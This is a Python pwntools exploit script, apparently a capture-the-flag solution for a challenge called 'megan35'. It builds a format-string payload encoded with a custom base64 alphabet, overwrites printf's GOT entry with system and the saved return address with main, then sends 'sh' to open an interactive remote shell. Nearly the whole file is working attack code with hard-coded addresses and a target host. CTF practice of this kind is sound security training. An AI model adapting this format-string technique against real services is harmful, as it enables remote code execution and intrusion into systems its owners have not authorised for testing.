# by hgarrereyn

from pwn import *

import base64
import binascii

char_megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
char_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
char_map = dict(zip(char_base64, char_megan35))

def m35encode(s):
    b = base64.b64encode(s)
    return ''.join([char_map[x] for x in b])


def r():
    print sock.recvline()

# ---

sock = remote('megan35.stillhackinganyway.nl', 3535)

sock.recvline()

# Overwrite printf@GOT with <system>
# system = 0xf7e50da0
system = 0xf7e53940
system_low = (system & 0xFFFF)
system_high = (system & 0xFFFF0000) >> 16

main = 0x080484ea
main_low = (main & 0xFFFF)
main_high = (main & 0xFFFF0000) >> 16

printf_got = 0x0804a00c

buff = ''

buff += '\x08\x04\xa0\x0c'[::-1] # printf@GOT
buff += '\x08\x04\xa0\x0e'[::-1] # printf@GOT + 2

buff += '\xff\xff\xdd\xcc'[::-1] # saved return address
buff += '\xff\xff\xdd\xce'[::-1] # saved return address + 2

buff_e = '' # stuff that needs to be encoded

# These need to be ordered from lowest to highest write value
buff_e += ('%' + str(main_high - 12) + 'x%10$hn')
buff_e += ('%' + str(system_low - main_high) + 'x%7$hn')
buff_e += ('%' + str(main_low - system_low) + 'x%9$hn')
buff_e += ('%' + str(system_high - main_low) + 'x%8$hn')

buff += m35encode(buff_e)

sock.sendline(buff)

c = sock.clean(timeout=1)

sock.sendline(m35encode('sh'))

print "Have a shell:"

sock.interactive()
